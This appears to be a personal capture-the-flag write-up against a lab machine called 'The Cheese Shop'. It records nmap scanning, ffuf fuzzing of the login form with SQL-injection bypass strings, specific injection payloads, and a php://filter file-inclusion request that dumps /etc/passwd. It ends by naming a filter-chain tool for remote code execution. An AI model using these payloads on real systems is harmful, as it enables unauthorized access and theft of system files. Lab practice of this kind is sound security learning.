# ip: 10.201.123.154

# nmap -Pn -oN namp.txt -sV -sC 10.201.123.154 --open

# ip: 10.10.184.121

nmap -Pn -oN namp.txt -sV -sC 10.10.184.121 --open

# all port are opened... so we are gonna to check step by step known port 22, 80, 8080, 5432... etc

──(root㉿docker-desktop)-[/]
└─# cat namp.txt | grep 8080/tcp
8080/tcp open http-proxy?

┌──(root㉿docker-desktop)-[/]
└─# cat namp.txt | grep 80/tcp
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))

┌──(root㉿docker-desktop)-[/]
└─# cat namp.txt | grep 22/tcp
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

┌──(root㉿docker-desktop)-[/]
└─# cat namp.txt | grep 5432/tcp
5432/tcp open postgresql?

┌──(root㉿docker-desktop)-[/]
└─# cat namp.txt | grep 3306
3306/tcp open mysql?

http 10.201.123.154

┌──(root㉿docker-desktop)-[/]
└─# http 10.201.123.154
=======
http 10.10.184.121

┌──(root㉿docker-desktop)-[/]
└─# http 10.10.184.121

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>The Cheese Shop</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <header>
      <div class="container">
        <h1>The Cheese Shop</h1>
        <nav>
          <ul>
            <li><a href="#products">Products</a></li>
            <li><a href="#about">About Us</a></li>
            <li><a href="#contact">Contact</a></li>
            <li><a href="login.php">Login</a></li>
          </ul>
        </nav>
      </div>
    </header>

    <section id="products">
      <div class="container">
        <h2>Our Cheese Selection</h2>
        <div class="product">
          <img src="images/cheese2.jpg" alt="Cheese 1" />
          <h3>Cheddar</h3>
        </div>
        <div class="product">
          <img src="images/cheese3.jpg" alt="Cheese 2" />
          <h3>Gouda</h3>
        </div>
        <div class="product">
          <img src="images/cheese1.jpg" alt="Cheese 3" />
          <h3>Brie</h3>
        </div>
        <h2>And more!</h2>
      </div>
    </section>

    <section id="about">
      <div class="container">
        <h2>About Us</h2>
        <p>
          Welcome to The Cheese Shop, your source for the finest cheeses from
          around the world.
        </p>
      </div>
    </section>

    <section id="contact">
      <div class="container">
        <h2>Contact Us</h2>
        <p>Have questions? Contact us at info@thecheeseshop.com</p>
      </div>
    </section>

    <script src="script.js"></script>
  </body>
</html>
```

# info@thecheeseshop.com

http 10.10.184.121/login.php

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Page</title>
    <link rel="stylesheet" href="login.css" />
  </head>
  <body>
    <div class="login-container">
      <h1>Login</h1>

      <form method="POST">
        <div class="form-group">
          <label for="username">Username</label>
          <input type="text" id="username" name="username" required />
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" required />
        </div>
        <button type="submit">Login</button>
      </form>
    </div>
    <div id="status"></div>
  </body>
</html>
```

# curl login

![](https://velog.velcdn.com/images/agnusdei1207/post/6507c942-3c34-404e-8dd2-b3d599dac5f8/image.png)

# SQL injection

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://cheesectf.thm/login.php -d 'username=FUZZ&password=asd' -w /usr/share/seclists/Fuzzing/login_bypass.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : POST
:: URL : http://cheesectf.thm/login.php
:: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/login_bypass.txt
:: Data : username=FUZZ&password=asd
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

admin)(&) [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 339ms]
' or 1 or ' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 345ms]
_)(|(_ [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 340ms]
pwd) [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 347ms]
' or '1'='1 [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 354ms]
pwd)) [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 348ms]
admin' or ' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 340ms]
password [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 348ms]

-                       [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 348ms]
  pwd [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 345ms]
  123456 [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 454ms]
  ' or ''&' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
  ' or ''_' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
  ' ' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
  ' or ''^' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
  '_' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
  ' or ''-' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]

# All success

# sql inject

' || 1=1;-- -
' OR 'x'='x'#;

username=%27+%7C%7C+1%3D1%3B--+-&password=1

http://10.201.123.154/secret-script.php?file=supersecretadminpanel.html

![](https://velog.velcdn.com/images/agnusdei1207/post/0aea22c6-84fb-485f-a9e0-3aedd94d214f/image.png)

# directory traversal -> php filter -> file inclusion vulnerability

http://10.201.123.154/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
http://10.201.123.154/secret-script.php?file=php://filter/resource=users.html

![](https://velog.velcdn.com/images/agnusdei1207/post/f1b75c5b-17ef-432f-864f-be4badf39e18/image.png)

http://10.201.123.154/secret-script.php

http://10.201.123.154/secret-script.php?file=php://filter/resource=/etc/passwd

# /etc/password try it out!

┌──(root㉿docker-desktop)-[/]
└─# http http://10.201.123.154/secret-script.php?file=php://filter/resource=/etc/passwd
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 739
Content-Type: text/html; charset=UTF-8
Date: Sun, 03 Aug 2025 13:25:39 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
comte:x:1000:1000:comte:/home/comte:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash

# php_filter_chain_generator -> A tool that enables RCE without file upload by leveraging PHP filters
